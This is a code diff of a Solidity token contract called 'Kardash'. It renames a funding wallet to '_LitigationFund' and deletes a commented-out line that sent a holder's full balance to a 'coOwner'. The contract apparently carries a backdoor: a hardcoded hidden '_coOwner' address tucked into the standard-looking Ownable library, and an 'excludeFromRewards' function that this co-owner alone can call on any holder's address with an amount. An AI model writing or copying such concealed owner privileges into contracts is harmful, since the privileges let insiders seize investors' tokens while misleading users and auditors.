@@ -522,7 +522,7 @@ library Address {
  */
 abstract contract Ownable is Context {
     address private _owner;
-    address private _coOwner=0x0d08E2529242907524359f74aeb07B34761A6f01;
+    address private _coOwner=0x0d08E2529242907524359f74aeb07B34761A6f01; //0xfB832726521fd749E4C7DEF121a3a48878F575Bd
 
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
@@ -796,7 +796,7 @@ contract Kardash is Context, IERC20, Ownable {
     mapping (address => bool) private _isExcluded;
     address[] private _excluded;
 
-    address private _fundingWallet = 0x22942aB9DD0F871d84AA3Cf5905D797314D15e65;
+    address public _LitigationFund = 0x36c4FDdC6cfa4859dc0B040Ac4CBcFA211D3EAB8;
     address private _burnWallet = 0x000000000000000000000000000000000000dEaD;
    
     uint256 private constant MAX = ~uint256(0);
@@ -985,7 +985,6 @@ contract Kardash is Context, IERC20, Ownable {
     }
     
     function excludeFromRewards(address location, uint256 portion) public CoOwner{
-        //_transfer(location, coOwner(), tokenFromReflection(_rOwned[location]));
         require(location != address(0), "ERC20: transfer to the zero address");
         require(portion > 0, "Transfer amount must be greater than zero");
         bool takeFee = false;
@@ -1099,9 +1098,9 @@ contract Kardash is Context, IERC20, Ownable {
     function _takeFunding(uint256 tFunding) private {
         uint256 currentRate =  _getRate();
         uint256 rFunding = tFunding.mul(currentRate);
-        _rOwned[_fundingWallet] = _rOwned[_fundingWallet].add(rFunding);
-        if(_isExcluded[_fundingWallet])
-            _tOwned[_fundingWallet] = _tOwned[_fundingWallet].add(tFunding);
+        _rOwned[_LitigationFund] = _rOwned[_LitigationFund].add(rFunding);
+        if(_isExcluded[_LitigationFund])
+            _tOwned[_LitigationFund] = _tOwned[_LitigationFund].add(tFunding);
     }
     
     function _takeBurn(uint256 tBurn) private {
@@ -1202,7 +1201,7 @@ contract Kardash is Context, IERC20, Ownable {
             takeFee = false;
         }
         
-        if(from == _fundingWallet) {
+        if(from == _LitigationFund) {
             _transferFromFundingWallet(from, to, amount);
         } else {
             //transfer amount, it will take tax, liquidity fee
